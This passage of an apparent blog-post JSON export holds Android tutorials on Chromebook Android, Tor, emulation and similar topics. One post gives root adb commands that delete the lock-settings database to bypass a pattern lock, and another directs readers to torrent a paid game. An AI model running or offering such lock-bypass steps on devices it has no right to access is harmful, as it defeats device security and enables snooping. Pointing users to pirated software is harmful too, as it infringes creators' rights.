http://localhost/wordpress/wp-content/uploads/2016/03/windows-xp-desktop-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/03/windows-xp-desktop.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n",
        "tags": [
            "windows",
            "windows android",
            "windows on android",
            "windows xp on android",
            "xp on android"
        ]
    },
    {
        "uri": "/disable-lock-screen-at-home/",
        "title": "Disable Lock screen at Home",
        "content": "{{ youtube DGIbx8dA7_M }}\r\n\r\nLet&#8217;s face it, at home, there might not be a huge risk to leaving your phone unlocked. Yes, a sibling could snoop into your phone and take a look at those risque pictures you have saved or see who you have been texting, but that might not be the absolute worst security breach to deal with. Luckily, Android Lollipop adds a trusted device feature that allows you to automatically disable your lock screen if you are on a trusted wifi network or connected to a trusted Bluetooth device. Fortunately, if you don&#8217;t have lollipop, there is still a way to achieve this. If you are feeling adventtorous, you could also a href=\"https://www.youtube.com/watch?v=21YfBO68eZw\" target=\"_blank\"use Tasker/a.\r\n\r\na href=\"https://play.google.com/store/apps/details?id=de.j4velin.delayedlock2.trial\" target=\"_blank\"Delayed Lock (Trial)/a\r\n",
        "tags": [
            "android",
            "disable",
            "home",
            "lock screen",
            "lockscreen",
            "trusted device",
            "wifi"
        ]
    },
    {
        "uri": "/android-lock-screen-notifications/",
        "title": "Android Lock Screen Notifications",
        "content": "{{ youtube CzYG1RJdwTE }}\r\n\r\nIf you&#8217;re looking for a way to get notifications on your lock screen, then check out this video: Android Lock Screen Notifications. Using an app called echo Lockscreen, you can get notifications on your device&#8217;s lock screen. It also turns on your screen when you get a notification such as a text message; I think that&#8217;s one of the major advantages to this app. Give it a try and tell me what you think about it. Would you use this over the many lock screen apps available?\r\n  \r\na href=\"https://play.google.com/store/apps/details?id=com.doublelabs.androscreen.echo\" target=\"_blank\"https://play.google.com/store/apps/details?id=com.doublelabs.androscreen.echo/a\r\n",
        "tags": []
    },
    {
        "uri": "/run-android-on-chromebook/",
        "title": "Run Android on Chromebook",
        "content": "{{ youtube HZR7yAZdy4o }}\r\n\r\nAre you tired of Chrome OS? Do you want a greater selection of apps and games? Well,  running Android on your Chromebook is a practical option. The performance is without compromise and almost everything works (except for the touchpad).  You will have access to the entire Google Play store so you can download games and thousands of apps. So here&#8217;s how to run Android on Chromebook.\r\n\r\nWhat You Will Need:\r\n\r\n  An Intel Powered Chromebook\r\n  A USB with at least 2GB of free space\r\n  a href=\"http://sourceforge.net/projects/android-x86/files/Release%204.4/\" target=\"_blank\"Android X86 iSO/a\r\n  a href=\"http://rufus.akeo.ie/?locale=ptPT\" target=\"blank\"Rufus/a\r\n\r\n Step 1: Developer Mode\r\n\r\nBefore you can run Android, you will need to put your Chromebook in developer mode. Developer Mode allows you to get root access to the command shell. Be aware that activating developer mode erases all of your information. Of course, due to the nature of Chrome OS, you won&#8217;t really have to worry about backing up apps or anything.\r\n\r\nThe instructions for entering developer mode will differ for each chromebook. On the Acer C720, hold the the ESC and* * Refresh (F3) keys and tap the Power button. This will put your chromebook into recovery mode.\r\n\r\n\r\n\r\nOnce you are inside of the recovery, press *Crtl+D *to activate developer mode. Your chromebook will reboot and you will hear two beeps, don&#8217;t panic. After the beeps, your chromebook will reboot again. It will erase your data and reboot you in developer mode.\r\n\r\nWhile developer mode is activated, whenever you reboot your device it will show the recovery screen for 30 seconds before entering into Chrome OS. Just press *Crtl+D *on the recovery screen if you don&#8217;t feel like waiting for 30 seconds.\r\n\r\n\r\n\r\nNow take a few seconds to reconfigure your Google account.\r\n\r\nStep 2: Create Bootable USB\r\n\r\nNext, it&8217;s time to create a bootable usb of the Android x86 iso using a free program called rofus. Make sure your USB drive is inserted in your computer and launch rofus. All you need to do is select the location of the Android  x86 iso and click start. It will unpack the image to your USB. You can disconnect it once it completes.\r\n\r\n\r\n\r\nStep 3: Enabling Legacy Bios\r\n\r\nIn order to boot from your USB device, you will need to enable the legacy bios. On the Chrome login screen press Crtl-Alt-F2 to enter the shell window.\r\n\r\n\r\n\r\nOnce you are inside the shell window type in the following: (source https://wiki.archlinux.org/index.php/Acer\\C720\\Chromebook)\r\n\r\n*chronos *(for the username)\r\n\r\n*sudo bash *(for Superuser privileges)\r\n\r\ncrossystem dev\\_boot\\_usb=1 dev\\_boot\\_legacy=1\r\n\r\nsudo reboot\r\n\r\n\r\n\r\nYour chromebook will reboot. Now, on the OS verification (recovery) screen, hit Crtl-L to bring up the legacy bios, then Esc to bring up the boot menu. Finally, choose your USB device and if everything goes well, Android should be booting.\r\n\r\n\r\n\r\n&nbsp;\r\n\r\nIn order to navigate the install menu, you will need to connect an external mouse because there are no trackpad drivers. Other than that, the performance is very fluid. You don&8217;t have much internal space to work with though, so bare that in mind.\r\n\r\n\r\n\r\n [1]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3142.jpg\r\n [2]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3143.jpg\r\n [3]: http://localhost/wordpress/wp-content/uploads/2014/09/rofus.png\r\n [4]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3158.jpg\r\n [5]: http://www.davebennett.tv/wp-content/uploads/2014/07/IMG_3159.jpg\r\n [6]: http://localhost/wordpress/wp-content/uploads/2014/09/IMG_3740.jpg\r\n [7]: http://localhost/wordpress/wp-content/uploads/2014/09/IMG_3738.jpg\r\n",
        "tags": [
            "android",
            "chrome",
            "chromebook",
            "emulation",
            "nexus",
            "run"
        ]
    },
    {
        "uri": "/best-paranoid-android-features/",
        "title": "Best Paranoid Android Features",
        "content": "{{ youtube 3YDYy9FsncI }}\r\n\r\nParanoid Android is by far one of my favorite custom roms.. It provides a stock like experience with added functionality. Each month the PA team has added a new signature feature to this amazing rom. So here&#8217;s a look at some of the best paranoid android features.\r\n\r\nDynamic System Bars:\r\n\r\ndiv\r\n  div\r\n    The newest feature found on Paranoid Android is Dynamic System bars. DSB allows you to tint your status and navigation bars to the color of the foreground app. This allows you to have a completely imersive feel when launching different apps. It&8217;s still in an early beta so it might cause some lag on your device.\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  h2\r\n    Recent Apps\r\n  /h2\r\n  \r\n  div\r\n    div\r\n      Another fairly new item found in PA is the new recent menu, based off of Android L. The PA time has miraculously managed to create their own version of the sliding actions cards that was previewed in the Android L developer preview. I&#8217;m a huge fan of the new recents. It&#8217;s modern, quick and clean. A little confusing at first, but in time you easily get use to it. There are still a few bugs to be worked out without but for the most part it&#8217;s stable enough to use.\r\n    /div\r\n    \r\n    div\r\n    /div\r\n    \r\n    div\r\n    /div\r\n    \r\n    h2\r\n      Hover\r\n    /h2\r\n    \r\n    div\r\n      div\r\n        The third signature feature of PA is hover. Hover allows you to open notifications in a small standalone window. This works regardless of where you&#8217;re at in your phone. Watching videos or playing games, it&#8217;s all a click away.\r\n      /div\r\n      \r\n      div\r\n      /div\r\n      \r\n      div\r\n      /div\r\n    /div\r\n    \r\n    h2\r\n      Peak\r\n    /h2\r\n    \r\n    div\r\n      div\r\n        I don&#8217;t really use Peak so often, but it&#8217;s a thing to have. Peak is sort of like the active notifications found on the Moto X. With Peak, your phone will notify you of any notifications if you pick up your device within 10 seconds of receiving the notification. Some days, it works better than others, but still nice to have it as an option.\r\n      /div\r\n      \r\n      div\r\n      /div\r\n      \r\n      div\r\n      /div\r\n      \r\n      h2\r\n        Theme Engine\r\n      /h2\r\n      \r\n      div\r\n        div\r\n          Finally, the feature that I absolutely love the most is the Theme Engine. The paranoid android theme engine allows you to customize almost any part of your device. You can change your icons system wide, get a new skin, different navigation buttons, and the list goes on. You can mix and match skins or purchase a full set from the Google play store. Honestly, the Theme engine is one of the best parts of Paranoid Android for me.\r\n        /div\r\n        \r\n        div\r\n        /div\r\n        \r\n        div\r\n          Which feature is your favorite?\r\n        /div\r\n      /div\r\n      \r\n      div\r\n      /div\r\n    /div\r\n  /div\r\n/div\r\n\r\n",
        "tags": [
            "android",
            "best",
            "custom",
            "engine",
            "features",
            "hover",
            "l",
            "nexus",
            "paranoid",
            "peak",
            "rom",
            "root",
            "theme",
            "top"
        ]
    },
    {
        "uri": "/run-android-apps-on-chromebook/",
        "title": "Run Android apps on Chromebook",
        "content": "{{ youtube nx8vIAjUNmo }}\r\n\r\nRecently, Google has released an Android run-time for Chrome OS that will allow developers to easily port their android applications to Chrome OS (Feel free to watch the a href=\"https://www.youtube.com/watch?v=wtLJPvx7-ys#t=6070\" target=\"_blank\"Keynote /afor more information). While this is a step in the right direction (and should have been included with Chrome OS from the very beginning, but I digress) there are only four official android apps available for Chrome OS (Evernote, Vine, Sight Words, Duolingo).\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nFortunately, developer a href=\"https://github.com/vladikoff/chromeos-apk/blob/master/archon.md\" target=\"_blank\"Vladikoff /ahas created a tool that will allow you to convert any existing Android app to work on Chrome OS. Not every app will be compatible though, especially if it requires Google Play services. So here&#8217;s how to run android apps on Chromebook:\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\nWhat You Will Need:\r\n\r\n  Chromebook\r\n  An Android APK (Any app or game that you want to test out)\r\n  Access to a Windows, Linux, Mac Machine.\r\n  a href=\"http://nodejs.org/download/\" target=\"_blank\"Node.js /a\r\n\r\n Step 1: Downloading the Official Run-time\r\n\r\nFirst, you will need to have the official run-time in order to run Android apps on Chrome OS. The easiest way to get the run-time is to download one of the official Android-Chrome apps listed above, such as a href=\"https://chrome.google.com/webstore/detail/evernote/dhfolfjkgpeaojbiicgheljefkfbbfkc?utmsource=chrome-ntp-icon\" target=\"blank\"Evernote/a. When you install it, it will automatically download and install the run-time.\r\n\r\n\r\n\r\nStep 2: Convert Android App\r\n\r\nNext, you will need to use the Node.js tool to convert the android app that you want to use. Download the installer that corresponds to your operating system. Open up the node.js command prompt and type in the following:\r\n\r\n npm install chromeos-apk -g\r\n\r\n\r\n\r\nThis will install the tool. Next navigate to the location of the Android apk file that you want to use. Then type in the following:\r\n\r\n chromeos-apk AppName.apk\r\n\r\n\r\n\r\nOf course, replace AppName with the name of your application. If everything goes well you should see green text along with a folder created in the same directory as your application. Transfer that folder to your Chromebook.\r\n\r\n\r\n\r\n Step 3: Install App\r\n\r\nFinally, on your Chromebook open up Chrome and go to settings &#8211;More Tools &#8211;Extensions. Make sure developer mode is checked and select load unpacked extension. Navigate to the folder of your application and choose open.\r\n\r\n\r\n\r\nIf all goes well, you should the App in the app drawer (it has the android logo).\r\n\r\n\r\n\r\nI tested an app I made along with the official Twitter app. Both worked flawlessly without any hiccups.\r\n\r\n\r\n\r\nARCHON Run-time:\r\n\r\nSo not to spoil anyone&8217;s fun, but you might have noticed a slight problem. With the default run-time listed above, you can only run one Android app at a time. Therefore, when I load my Twitter app, it replaces my HackMe app that I already installed.  Unless you&#8217;re satisfied with only having one android app at a time on your chromebook, then you probably want to give this run-time a try. The archon run-time is a modified version of the official run-time released by Google. It was also developed by Vladikoff and will also allow you to run Android apps on Chome form your Windows, Linux or Mac computer. It will replace the official Google run-time. For more information, read a href=\"https://github.com/vladikoff/chromeos-apk/blob/master/archon.md\" target=\"_blank\"this/a. \\\\*You will need to have a 64bit version of Chrome installed in order to do this.\\\\*\r\n\r\nStep 1: Download the Run-time\r\n\r\nDownload the archon runtime a href=\"https://bitbucket.org/vladikoff/archon/get/v1.0.zip\" target=\"_blank\"here/a. Extract the zip and load it as an unpacked extension in chrome.\r\n\r\n\r\n\r\n Step 2: Convert Android Apps\r\n\r\nPerform the same procedure as Step 2 listed above, but add on &#8211;archon when you convert the app.\r\n\r\nchromeos-apk AppName.apk &#8211;archon\r\n\r\n\r\n\r\nStep 3: Install the App\r\n\r\nAs before, you will need to transfer the folder created and load it as an unpacked extension. This time, when you load another app it will not replace the previous one you installed.  There you have it!\r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\nsources:\r\n\r\na href=\"https://www.reddit.com/r/chromeapks/comments/2gywae/chromeosapkv300conversiontoolnowworkson/\" target=\"blank\"https://www.reddit.com/r/chromeapks/comments/2gywae/chromeosapkv300conversiontoolnowworks_on//a\r\n\r\na href=\"https://github.com/vladikoff/chromeos-apk\" target=\"_blank\"https://github.com/vladikoff/chromeos-apk/a\r\n\r\na href=\"https://github.com/vladikoff/chromeos-apk/blob/master/archon.md\" target=\"_blank\"https://github.com/vladikoff/chromeos-apk/blob/master/archon.md/a\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2014/09/chromewebstore.bmp\r\n [2]: http://localhost/wordpress/wp-content/uploads/2014/09/evernote.bmp\r\n [3]: http://localhost/wordpress/wp-content/uploads/2014/09/install-tool.bmp\r\n [4]: http://localhost/wordpress/wp-content/uploads/2014/09/convert-apps.bmp\r\n [5]: http://localhost/wordpress/wp-content/uploads/2014/09/directories.bmp\r\n [6]: http://localhost/wordpress/wp-content/uploads/2014/09/extensions.bmp\r\n [7]: http://localhost/wordpress/wp-content/uploads/2014/09/load-unpacked-extension.bmp\r\n [8]: http://localhost/wordpress/wp-content/uploads/2014/09/app-launcher.bmp\r\n [9]: http://localhost/wordpress/wp-content/uploads/2014/09/twitter.bmp\r\n [10]: http://localhost/wordpress/wp-content/uploads/2014/09/app.bmp\r\n [11]: http://localhost/wordpress/wp-content/uploads/2014/09/Screenshot-2014-09-21-at-12.21.18-PM.png\r\n [12]: http://localhost/wordpress/wp-content/uploads/2014/09/node-js-archon.png\r\n [13]: http://localhost/wordpress/wp-content/uploads/2014/09/Screenshot-2014-09-21-at-12.26.12-PM.png\r\n [14]: http://localhost/wordpress/wp-content/uploads/2014/09/Screenshot-2014-09-21-at-12.31.20-PM.png\r\n",
        "tags": [
            "android",
            "applications",
            "apps",
            "archon",
            "chrome",
            "chromebook",
            "emulation",
            "games",
            "nexus",
            "os",
            "run",
            "runtime"
        ]
    },
    {
        "uri": "/boot-computer-from-android-phone/",
        "title": "Boot Computer from Android Phone",
        "content": "{{ youtube 8Y0T2zxTtnU }}\r\n\r\nHave you ever found yourself in a situation where you didn&#8217;t have a flash drive handy? Well, the other day I was trying to re-install Windows on my laptop, and sure enough, my USB flash drive conveniently went missing. Luckily, I was able to use my Nexus 5 to mount the ISO and boot my laptop from it. So here&#8217;s how you can boot computer from Android phone:\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nWhat You&8217;ll Need:\r\n\r\n  A rooted Android Device\r\n  Laptop or Computer that can be booted from USB\r\n  a href=\"https://play.google.com/store/apps/details?id=com.softwarebakery.drivedroid\" target=\"_blank\"Drive Droid/a\r\n\r\nStep 1: Select Image File\r\n\r\nIn order to mount an image or iso file from your phone, you&8217;re going to need to use a special app called Drive droid. Download it from the Play Store. After you launch Drive Droid, it will scan for any available images on your device (located in downloads/images). If you don&#8217;t have an image, you can download one of many Linux distributions available. Go to the plus icon and select the option to download an ISO.\r\n\r\n\r\n\r\nMounting Windows:\r\n\r\nIf you don&8217;t plan to use a Linux distribution and want to mount a Windows image instead, you first need to create a blank disk image. Allocate the appropriate size that you need and hit done to create the image.\r\n\r\nNow go to the plus icon and choose the option to add image from file. Navigate to /downloads/images and select your newly created image file.\r\n\r\n\r\n\r\nThen select the image and mount it as a writable USB. Connect your phone to your computer. You should see a blank drive.\r\n\r\n\r\n\r\nFinally, download a free program called a href=\"http://rufus.akeo.ie/downloads/rufus-1.4.10.exe\" target=\"_blank\"Rufus/a. Inside of Rufus select your Windows iso file and make sure the write location is set to the blank drive. Then hit write.\r\n\r\n\r\n\r\nOnce that&#8217;s done, follow the rest of this tutorial.\r\n\r\nStep 2: Mounting the Image/iso\r\n\r\nNow tap on the image or iso file, and select to mount it as a writable USB. (If this doesn&8217;t work, change it to CD-Rom). If you&#8217;re using an Image file (using the Windows Method above, then you first must manually add the image before you can mount it).\r\n\r\n\r\n\r\nStep 3: Booting\r\n\r\nConnect your phone to your computer or laptop and make sure the boot order is set to boot from the USB. If all goes well, your computer should boot from the operating systen mounted on via Drive Droid.\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2014/10/Screenshot_2014-09-30-21-28-22.png\r\n [2]: http://localhost/wordpress/wp-content/uploads/2014/10/Screenshot_2014-09-30-21-28-39.png\r\n [3]: http://localhost/wordpress/wp-content/uploads/2014/10/Screenshot_2014-10-01-21-08-42.png\r\n [4]: http://localhost/wordpress/wp-content/uploads/2014/10/mount.png\r\n [5]: http://localhost/wordpress/wp-content/uploads/2014/10/rofus.png\r\n [6]: http://localhost/wordpress/wp-content/uploads/2014/09/Screenshot_2014-09-30-21-45-43.png\r\n",
        "tags": [
            "android",
            "boot",
            "computer",
            "from",
            "pc",
            "tablet",
            "usb"
        ]
    },
    {
        "uri": "/tor-android/",
        "title": "Tor for Android",
        "content": "{{ youtube X0kAEwKJfhs }}\r\n\r\nLet&#8217;s talk about internet privacy. So as you might be aware of, when you open up a tab in incognito mode you&#8217;re not really browsing anonymously. Your ISP and and any one else who is monitoring your internet can get your location and see the sites you visited. To truly browse the internet privately, you need to use tor.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n  \r\nTo keep it brief, Tor is a mesh of proxy servers that bounces your IP to different locations across the globe. The connection is encrypted throughout most of the journey. So a href=\"https://en.wikipedia.org/wiki/Tor%28anonymitynetwork%29\" target=\"_blank\"here/a is a good wiki link if you want to learn more about tor. So now, let&#8217;s take a look at tor for Android. This is accomplished using an app called Orbot.\r\n\r\n&nbsp;\r\n\r\nWhat You&8217;ll Need:\r\n\r\n  A rooted Android device (not a necessity but recommended)\r\n  a href=\"https://play.google.com/store/apps/details?id=org.torproject.android&hl=en\" target=\"_blank\"Orbot/a\r\n  a href=\"https://play.google.com/store/apps/details?id=info.guardianproject.browser&hl=en\" target=\"_blank\"Orweb Browser/a\r\n\r\nStep 1: Download and Install Orbot\r\n\r\nOrbot makes use of the Tor proxies. When you first launch orbot, it will take you through the setup. If you have root, make sure to request superuser access. You should also download the Orweb browser, because it has extra privacy and security features that chrome does not have, and the only way that you can connect to Tor if you are not using a rooted Android device.\r\n\r\nNow, If you do have root, you can use the transparent proxy feature that will  forward all of your connections through the Tor network no matter which app you&8217;re using, and also for tethering. So in this case, you can use it with normal apps such as chrome and you don&#8217;t have to use the orweb browser\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nStep 2: Activate the Service\r\n\r\ndiv\r\n  div\r\n    Hold down the app&8217;s power button to activate the service.  Now check that you&#8217;re connected to the Tor network. Hopefully, the browser opens up confirming that you are indeed connected (Green congratulatory text).\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  div\r\n\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  div\r\n    To test this out, I&#8217;m going to go to Google.com and search, what&#8217;s my IP adress.\r\n  /div\r\n  \r\n  div\r\n    According to one site, I&#8217;m currently located in England, which I am not.\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  div\r\n\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  div\r\n  /div\r\n  \r\n  div\r\n    div\r\n      Now when using tor keep in mind a few things. First, your internet is going to be slower than usual because of the many servers that your connection is bouncing from. Also, if you&#8217;re using this on a non rooted device, all of you other connections through apps such as chrome, is not going through the tor network. And remember as with anything, Tor is not 100% perfect. There are still gaps in security that could easily be breached. Especially if you use plugins such as Flash.\r\n    /div\r\n  /div\r\n/div\r\n\r\ndiv\r\n/div\r\n\r\ndiv\r\n/div\r\n",
        "tags": [
            "anonymously",
            "browse",
            "internet",
            "nexus",
            "oneplus one",
            "privately",
            "smartphone",
            "tor"
        ]
    },
    {
        "uri": "/adobe-flash-player-android-lollipop/",
        "title": "Adobe Flash Player Android Lollipop",
        "content": "{{ youtube XwLKd5F1UM4 }}\r\n\r\n* *\r\n\r\nAdobe Flash Player Android Lollipop:\r\n\r\nAt one time, Android fully supported adobe flash player. However, official support ended by the time KitKat was released (though there were still a few hacks that you could use to get it). Of course, HTML5 video players are the preferred option, but unfortunately, there are some delporn/del sites that still rely heavily on adobe flash content.\r\n\r\n[adinserter block=&8221;5&#8243;]\r\n\r\n&nbsp;\r\n\r\nWell, if you have an Android device running Lollipop you can now access the flash content once more. It&#8217;s all thanks to a new update to the Dolphin browser that adds support for the flash plugin. Yes, actual support. It doesn&#8217;t send it to some absurd server to process it, then return it back to you like some other browser out there. Here&#8217;s a real quick guide on how to install adobe flash player on Android lollipop.\r\n\r\nWhat You&8217;ll Need:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=mobi.mgeek.TunnyBrowser&hl=en\" target=\"_blank\"Dolphin Browser/a\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n\r\n&nbsp;\r\n",
        "tags": [
            "adobe",
            "android",
            "dolphin",
            "flash",
            "install",
            "lollipop",
            "nexus",
            "oneplus one",
            "player",
            "web browser"
        ]
    },
    {
        "uri": "/bypass-android-lock-screen/",
        "title": "Bypass Android Lock screen",
        "content": "{{ youtube 2ti6QLmDZc8 }}\r\n\r\nLocked out of your phone? Well you are in luck. There is a way to bypass your Android lock screen. Now before you get too excited, there are a few stipulations. First, this only works when your security is set to pattern lock. Secondly, you must have a rooted android device. And finally, you need to have adb debugging enabled. I know this might only be a small percentage of people out there, so for those of you who do, here&#8217;s how you can bypass Android lock screen.\r\n\r\nWhat You Will Need:\r\n\r\n  Rooted Android Device\r\n  Computer with ADB Installed\r\n\r\n How To:\r\n\r\nConnect your device to your computer and open up command prompt. Type in:\r\n\r\n adb devices\r\n\r\nTo make sure your device is detected. Now to access root type in:\r\n\r\n adb shell\r\n \r\n su\r\n\r\n\r\n\r\nThen type in the following to remove the locksettings database.\r\n\r\n rm /data/system/locksettings.db\r\n \r\n rm /data/system/locksettings.db-wal\r\n \r\n rm /data/system/locksettings.db-shm\r\n\r\n\r\n\r\nFinally, reboot your device for the changes to take effect. Your lock screen should be removed now.\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/01/su.jpg\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/01/fina.jpg\r\n",
        "tags": [
            "adb",
            "android",
            "bypass",
            "lock screen",
            "mod",
            "oneplus one",
            "root"
        ]
    },
    {
        "uri": "/play-portal-on-any-android/",
        "title": "Play Portal on any Android",
        "content": "Ah yes, who doesn&#8217;t love a good game of Portal? If you are lucky enough to own an Nvidia Shield (or any Tegra 4 device), you already have access to the game plus more exclusives. But what if you do not own an Nvidia Shield? Well there is still a way to play Portal thanks to an app called GLTools. GLtTools will emulate the Tegra 4 drivers, so that the app thinks you are using a Tegra 4 device. As far as performance, I want to first remind you that you&#8217;re playing a game that wasn&#8217;t meant to be played on anything else other than the powerful Tegra 4.\n\nWith that said, the performance was pretty decent on my One plus One. Not amazing frame rate, but very playable. Also keep in mind that this might not work on your device. At first, I could not get this to work on my Oneplus One running Lollipop (5.02) but it works perfectly on Kitkat (4.4.4). So YMMV. In the end, if you are serious about playing Portal on the go, buy an Nvidia shield. Otherwise, give this a try.\n\n{{ ad }}\n\n&nbsp;\n\nPlay Portal on any Android:\n\n What You Will Need:\n\n  Rooted Android Device\n  a href=\"https://play.google.com/store/apps/details?id=com.n0n3m4.gltools\" target=\"_blank\" rel=\"noopener\"GLTools/a\n  a href=\"https://play.google.com/store/apps/details?id=com.locnet.gamekeyboard2\" target=\"_blank\" rel=\"noopener\"GameKeyboard+/a (Only if you do not have a Bluetooth or USB controller)\n\nDownloading Portal:\n\nThere is no way to buy Portal from the Play Store, even if you wanted to. Perhaps you could use a build prop tweak to make the Play Store think that you are using an Nvidia device, but I have not tried that. So, the only other way to get it is searching the web. To make things easier, download the app a href=\"https://play.google.com/store/apps/details?id=hu.tagsoft.ttorrent.lite\" target=\"_blank\" rel=\"noopener\"tTorrent/a. Launch the app, and click the search button (it will prompt you to also download the search extension). Search for Portal apk, but filter the results to only show from Kickass torrents (or any other site that might have the application). Then select download. Since the content is 2.3GB it might take awhile to fully download.\n\n Transferring the Content:\n\nAfter you have downloaded the content, transfer the folder named com.nvidia.valvesoftware.portal to /sdcard/Android/Obb. Then install the Portal apk, but do not open it yet.\n\n&nbsp;\n\nGLTools:\n\n{{ ad }}\n\nDownload GLTools from the play store. When you launch it, it will prompt you to choose a texture decoder. Make sure to select TEX(DE)coder then hit install. It will reboot your device.\n\nAfter your device has rebooted, launch GLTools and naviagte to the Portal app. Make sure to select the option to enable custom settings for this app. Next select optimize GLSL shaders. Then select the fake cpu and gpu options and choose Tegra 4 as the template. Finally, select all the emulation options at the bottom.\n\n Game Keyboard:\n\nThis step can be skipped if you already have a Bluetooth or USB controller. Portal requires a controller and will not work with a touchscreen. Since I do not have any controllers, I am going to use the GameKeyboard+ app. Inside the app, go to settings and* quick setup.* Make sure to choose touchscreen/Joystick. Then set the button size to the minimum value.  Finally, make sure the custom hot key option is selected and set a custom hot key. I used the volume up button. Then, go back and start the service.\n\nLaunching Portal:\n\n{{ ad }}\n\nNow the fun part, launching Portal. Since you are using the Game Keyboard, you will need to use that to navigate to the app. When you launch Portal the Valve intro and logo should appear. It might go black for a minute afterwards, so give it some time and Portal should appear. Like I mentioned earlier, the performance is not as bad as what you would expect. I would still much rather play this on a shield, but it&8217;s still enjoyable on my phone.\n\n&nbsp;\n\n [1]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-07-14-28-10.png\n [2]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-07-14-28-18.png\n [3]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-07-14-28-27.png\n [4]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-09-00-46-40.png\n [5]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-09-00-50-34.png\n [6]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-09-00-47-05.png\n [7]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-09-00-47-11.png\n [8]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-09-01-02-14.png\n [9]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-09-00-47-57.png\n [10]: http://localhost/wordpress/wp-content/uploads/2015/01/Screenshot_2015-01-09-00-48-06.png\n",
        "tags": [
            "android",
            "emulation",
            "galaxy",
            "game",
            "half life",
            "mobile",
            "play",
            "portal",
            "samsung",
            "tegra 4"
        ]
    },
    {
        "uri": "/play-psp-games-android/",
        "title": "Play PSP Games on Android",
        "content": "{{ youtube d9NxlMTDi88 }}\r\n\r\nPlay PSP Games on Android\r\n\r\nYes, you can play PSP games on your Android device. This is not a gimmick, nor some sort of absurd remote VNC. This is pure emulation right on your Android device. It is all thanks to the app PPSSPP. Surprisingly, some games work with excellent frame rate and graphics quality (Naruto for example). Keep in mind though, not every game will be compatible and it will not work with every device. So YMMV.\r\n\r\n What You&#8217;ll Need:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=org.ppsspp.ppsspp\" target=\"_blank\"PPSSPP/a\r\n  a href=\"http://www.ppsspp.org/files/cube.elf\" target=\"_blank\"Cube Elf/a\r\n  PSP .iso or .cso game.\r\n\r\nStep 1: Find PSP Game\r\n\r\nThe first thing you need to do is find a PSP game. If you already own a PSP game, then there are tools on the web which you can use to extract the actual game file. Of course, you can find anything with a little Google searching.\r\n\r\n Step 2: Preparation\r\n\r\nNow, download PPSSPP from the play store. Also download the Cube.elf file to your device. Inside of PPSSPP, navigate Games and go to where you downloaded the cube elf file, then launch it. If it opens, then that means your device is capable of handling PSP games. Finally, go and launch a game. If all goes well, it should boot.\r\n\r\n\r\n\r\nIf the graphics look terrible, feel free to go inside of the settings and change the rendering resolution and display resolution to get the best quality output. Be aware that this could cause performance issues with the game. Also, for some games (such as Ratchet and Clank) you might have to enable Frame skipping.\r\n\r\n\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/02/Screenshot_2015-02-17-14-26-17.png\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/02/Screenshot_2015-02-17-14-26-23.png\r\n [3]: http://localhost/wordpress/wp-content/uploads/2015/02/Screenshot_2015-02-17-14-31-04.png\r\n",
        "tags": [
            "android",
            "droid",
            "emulate",
            "galaxy",
            "games",
            "gaming",
            "nexus",
            "play",
            "playstation",
            "psp"
        ]
    },
    {
        "uri": "/run-python-android/",
        "title": "Run Python on Android",
        "content": "{{ youtube hhgF3ioY-zU }}\r\n\r\nHave you ever wanted to program on your phone? Well, believe it or not, you can craft code right in the palm of your hands. Python is not only a flexible programming language, it is also capable of running on your Android phone thanks to the app QPython3.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nRun Python on Android\r\n\r\n What You&#8217;ll Need:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=com.hipipal.qpy3\" target=\"_blank\"QPython3/a\r\n\r\nWith QPython3 you have access you to a multitude of tools. For example, you can use the Python interpreter.\r\n\r\n\r\n\r\nYou can also edit and run your own python files. To run a python file, click the run button. Then use Linux directory commands to navigate to the folder your python file is in. Finally type in &#8220;python FileName.py&#8221; to run.\r\n\r\n\r\n\r\nThe app also gives you access to Android specific components such as Bluetooth and WiFi. Overall, if you are looking for a way to try out programming give this  try.\r\n\r\n&nbsp;\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2015/02/Screenshot_2015-02-17-12-42-19.png\r\n [2]: http://localhost/wordpress/wp-content/uploads/2015/02/Screenshot_2015-02-17-12-42-53.png\r\n",
        "tags": [
            "android",
            "code",
            "droid",
